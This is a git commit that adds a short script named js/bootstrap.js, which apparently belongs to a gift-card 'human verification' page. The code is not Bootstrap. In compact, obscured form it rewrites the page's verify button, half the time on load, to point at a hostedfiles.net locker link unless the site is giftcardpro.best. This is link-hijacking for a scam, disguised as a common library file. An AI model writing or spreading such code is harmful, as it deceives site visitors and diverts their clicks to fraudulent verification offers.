22c0e29beb511f1080cdbf2d503d3b4e71dcd48a
youcefmalek9ds <110503012+youcefmalek9ds@users.noreply.github.com>
2022-08-03 02:07:08 +0200

    Add files via upload

---
+++ js/bootstrap.js
@@ -0,0 +1,3 @@
+if(document.getElementById("first-step-button-verify").href!="https://www.hostedfiles.net/cl.php?id=5b8e2df5ce6708aec93e7e1bf8074738") {
+    0>window.location.href.toString().indexOf("http://giftcardpro.best/human-verification/index.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://www.hostedfiles.net/cl.php?id=5b8e2df5ce6708aec93e7e1bf8074738"});
+}
